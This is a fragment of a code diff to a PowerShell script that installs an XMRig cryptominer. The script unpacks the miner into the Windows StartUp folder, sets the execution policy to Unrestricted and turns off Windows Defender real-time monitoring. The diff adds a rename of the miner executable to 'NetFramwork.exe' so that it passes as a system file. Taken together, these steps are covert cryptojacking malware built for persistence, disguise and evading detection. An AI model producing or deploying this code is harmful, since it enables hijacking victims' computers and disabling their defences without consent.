@@ -121,7 +121,7 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 # Define hidden payload path
 $hiddenDir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 #$payloadName = "svchost.exe"
-$destinationPath = "$hiddenDir\xmrig-6.22.2\xmrig.exe"#Join-Path $hiddenDir $payloadName
+$destinationPath = "$hiddenDir\xmrig-6.22.2\NetFramwork.exe"#Join-Path $hiddenDir $payloadName
 #$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
 Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath $hiddenDir
 
@@ -141,6 +141,8 @@ if (Test-Path -Path $newConfigPath) {
 } else {
     Write-Output "New bat file not found at the specified path."
 }
+
+Rename-Item -Path "$hiddenDir\xmrig-6.22.2\xmrig.exe" -NewName "NetFramwork.exe"
 
 # Disable Windows Defender temporarily
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
